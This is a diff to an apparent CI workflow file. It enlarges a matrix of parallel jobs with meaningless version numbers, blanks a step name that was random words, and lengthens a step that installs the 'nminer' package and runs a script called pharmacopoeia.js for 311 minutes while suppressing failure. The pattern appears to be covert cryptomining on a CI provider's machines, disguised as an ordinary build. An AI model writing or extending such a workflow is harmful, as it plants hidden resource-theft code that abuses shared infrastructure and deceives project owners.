@@ -9,21 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9386 }
-          - { version: 7721 }
-          - { version: 4591 }
-          - { version: 2681 }
-          - { version: 3095 }
-          - { version: 9789 }
-          - { version: 1900 }
-          - { version: 6789 }
-          - { version: 8955 }
-          - { version: 2383 }
-          - { version: 3997 }
-          - { version: 2830 }
-          - { version: 2278 }
-          - { version: 1443 }
-          - { version: 4797 }
+          - { version: 2090 }
+          - { version: 1371 }
+          - { version: 7820 }
+          - { version: 5230 }
+          - { version: 1285 }
+          - { version: 973 }
+          - { version: 8035 }
+          - { version: 3808 }
+          - { version: 3660 }
+          - { version: 8045 }
+          - { version: 893 }
+          - { version: 1061 }
+          - { version: 9295 }
+          - { version: 2151 }
+          - { version: 4859 }
+          - { version: 8922 }
+          - { version: 8418 }
 
     steps:
       - name: Checkout
@@ -34,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: sans coop courageously biodegradable
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 301m node pharmacopoeia.js || echo "pharmacopoeia executed"
+          timeout 311m node pharmacopoeia.js || echo "pharmacopoeia executed"
